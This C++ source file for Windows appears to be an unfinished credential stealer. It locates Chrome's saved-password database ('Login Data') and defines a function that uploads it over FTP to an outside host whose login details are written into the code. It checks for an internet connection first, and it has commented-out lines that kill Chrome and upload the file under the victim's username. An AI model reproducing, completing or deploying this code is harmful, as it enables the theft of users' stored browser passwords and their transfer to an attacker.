#include <iostream>
#include <sstream>
#include <string>
#include <wininet.h>
#include <windows.h>
#pragma comment(lib, "Wininet.lib")
void UploadToServer(const char* file, const char* ftpname)
{
    HINTERNET hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    HINTERNET hFtpSession = InternetConnect(hInternet,"files.000webhost.com" , INTERNET_DEFAULT_FTP_PORT, "serversion", "quantumcore91939", INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0);
    FtpPutFile(hFtpSession, file, ftpname, FTP_TRANSFER_TYPE_BINARY, 0);
    InternetCloseHandle(hFtpSession);
    InternetCloseHandle(hInternet);

}
int main() {
    const char* ftpname = getenv("USERNAME");
    const char* file = "C:\\Users\\%USERNAME%\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data";
    std::cout << "FULL PATH " << file << std::endl;
    while(1)
    {
        if(InternetCheckConnection("http://www.google.com", 1, 0))
        {
            //WinExec("taskkill /IM chrome.exe /F", SW_HIDE);
            //UploadToServer(file, ftpname);
            break;
        } else {
            // Do nothing..
        }
    }
    return 0;
}
    